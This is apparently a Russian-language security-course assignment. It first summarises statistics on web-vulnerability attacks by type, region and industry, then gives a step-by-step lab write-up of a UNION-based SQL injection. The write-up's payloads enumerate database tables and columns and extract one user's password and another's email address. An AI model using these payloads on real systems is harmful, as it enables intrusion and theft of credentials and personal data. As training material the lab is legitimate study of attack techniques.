2. Доля успешных атак через эксплуатацию веб-уязвимостей

Статистика сильно зависит от того, кого именно исследовали. Но общая тенденция одна: веб — это главная брешь в инфраструктуре многих компаний.

Мировая статистика:

  • Общий срез (Verizon DBIR 2025): Около 20-25% всех подтвержденных утечек данных в мире начинаются с эксплуатации веб-приложений.
  • Трафик и API (Cloudflare): Более 60% всего динамического трафика сейчас приходится на API. При этом около 12% всех HTTP-запросов к API классифицируются ИБ-системами как вредоносные попытки эксплуатации уязвимостей.

Статистика по России и СНГ (Positive Technologies & F.A.C.C.T.):

  • В среднем в 31-35% случаев исходным вектором успешной атаки на корпоративную сеть становятся веб-уязвимости.
  • Уязвимости на сетевом периметре (в основном это публичные веб-интерфейсы почты, VPN-шлюзов и корпоративных мессенджеров) позволили хакерам проникнуть внутрь в 43% расследованных инцидентов.

Scope по размеру компаний:

  • Малый и средний бизнес (SMB): Их чаще ломают через обычный фишинг, поэтому доля веб-уязвимостей составляет всего ~15%.
  • Крупный бизнес (Enterprise / IT): Доля успешных атак через веб-уязвимости достигает 45%, так как у корпораций выставлено наружу огромное количество сервисов и микросервисов, за которыми сложно следить.

3. Распределение по конкретным уязвимостям

Хакеры всё реже используют сложные цепочки эксплойтов и всё чаще бьют по проблемам с логикой доступа (Broken Access Control) и старым добрым инъекциям.

Глобальное распределение (по данным Edgescan и OWASP на 2025 год):

Тип уязвимости Доля (%) Описание / В чем опасность
Broken Access Control 29% Нарушение контроля доступа. Пользователь может получить доступ к админке или чужим данным (например, уязвимости IDOR/BOLA).
SQL Injection 19% Выполнение произвольных запросов к БД. Ведет к краже или удалению баз данных.
Cross-Site Scripting (XSS) 15% Выполнение скриптов в браузере жертвы. Обычно используется для воровства cookie-файлов и сессий.
Security Misconfiguration 12% Небезопасная настройка: забытые дефолтные пароли, открытые порты, оставленные панели отладки (debug).
Vulnerable Components 10% Использование устаревших библиотек и фреймворков с известными багами (Supply Chain атаки).

Распределение конкретных веб-атак в России (по данным BI.ZONE):

Тип атаки / Уязвимость Доля от общего числа веб-атак (%)
Remote Code Execution (RCE - удаленное выполнение кода) 36%
Path traversal (Доступ к системным файлам) 16%
XSS (Кража данных посетителей) 14%
SQL-инъекции 10%
Прочие (SSRF, XXE, логические ошибки) 24%

4. Отраслевая специфика (Scope по индустриям)

Выбор уязвимости для атаки сильно зависит от сферы деятельности компании-жертвы:

  • Финансовый сектор (Банки): Меньше всего страдают от классических SQL-инъекций (около 11%), так как защита баз данных там выстроена хорошо. Зато они главная мишень для атак на логику API — хакеры пытаются манипулировать балансом или красть данные клиентов в обход интерфейса.
  • Медицина: 53% всех успешных веб-атак приходится на RCE. Злоумышленники легко ломают старые веб-интерфейсы медицинского оборудования и слабозащищенные порталы для пациентов.
  • Транспорт и логистика: 73% атак — это попытки несанкционированного доступа к файлам (Path traversal), чтобы скачать путевые листы, базы клиентов или логи серверов.
  • Государственные организации: 66% атак используют XSS. Атакуют сайты региональных ведомств для кражи сессий авторизованных пользователей.
  • E-commerce (Ритейл): Эта отрасль чаще других страдает от SQL-инъекций (26%), так как интернет-магазины завязаны на огромные, часто самописные базы товаров, скидок и пользователей.

Часть 2

Цель: Получить данные пользователей Volk2 и Vinni-pukh.

1. Ищем нужные id

  • Запрос: ?id=1
  • Ответ: Ваш id:1 Ваш логин:admin
  • Запрос: ?id=4
  • Ответ: Ваш id:4 Ваш логин:Vinni-pukh
  • Запрос: ?id=9
  • Ответ: Ваш id:9 Ваш логин:Volk2
  • Запрос: ?id=1'
  • Ответ: You have an error in your SQL syntax; check the manual that corresponds to your MySQL...
  • Комментарий: Теперь мы знаем, что это MySQL

2. Подбор количества столбцов(?id=1' ORDER BY i-- +)

  • Запрос: ?id=1' ORDER BY 5-- +
  • Ответ: Unknown column '5' in 'order clause'
  • Комментарий: Слишком много.
  • Запрос: ?id=1' ORDER BY 3-- +
  • Ответ: Ваш id:1 Ваш логин:admin
  • Комментарий: Ошибки нет, значит, в таблице 3 столбца.

3. Вывод данных через UNION

  • Комментарий: Берём id =-1, тк если данные есть, то выводятся они
  • Запрос: ?id=-1' UNION SELECT 1,2,3-- +
  • Ответ: Ваш id:1 Ваш логин:2
  • Комментарий: Данные выводятся во 2 столбец (логин) и 1 (id). 3 столбец не виден на странице.

4. Поиск таблиц

  • Запрос: ?id=-1' UNION SELECT GROUP_CONCAT(table_name), 1, 3 FROM information_schema.tables WHERE table_schema=database()-- +
  • Ответ: Ваш id:emails,users Ваш логин:1
  • Комментарий: Нашли две таблицы emails и users

5. Поиск колонок

  • Запрос: ?id=-1' UNION SELECT GROUP_CONCAT(column_name), 2, 3 FROM information_schema.columns WHERE table_name='users'-- +
  • Ответ: Ваш id:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password Ваш логин:2
  • Комментарий: Нашли столбец password.

6. Получение пароля Volk2

  • Запрос: ?id=-1' UNION SELECT username, password, 3 FROM users WHERE username='Volk2'-- +
  • Ответ: Ваш id:Volk2 Ваш логин:Wa spoiuuuuu
  • Комментарий: Пароль Volk2: Wa spoiuuuuu.

7. Поиск почты Vinni-pukh

  • Запрос: ?id=-1' UNION SELECT GROUP_CONCAT(column_name), 2, 3 FROM information_schema.columns WHERE table_name='emails'-- +
  • Ответ: Ваш id:id,email_id Ваш логин:2
  • Комментарий: Есть столбцы id и email_id
  • Запрос: ?id=-1' UNION SELECT id, email_id, 3 FROM emails WHERE id=4-- +
  • Ответ: Ваш id:4 Ваш логин:honey_lover@otus-lab.com
  • Комментарий: Почта Vinni-pukh: honey_lover@otus-lab.com.
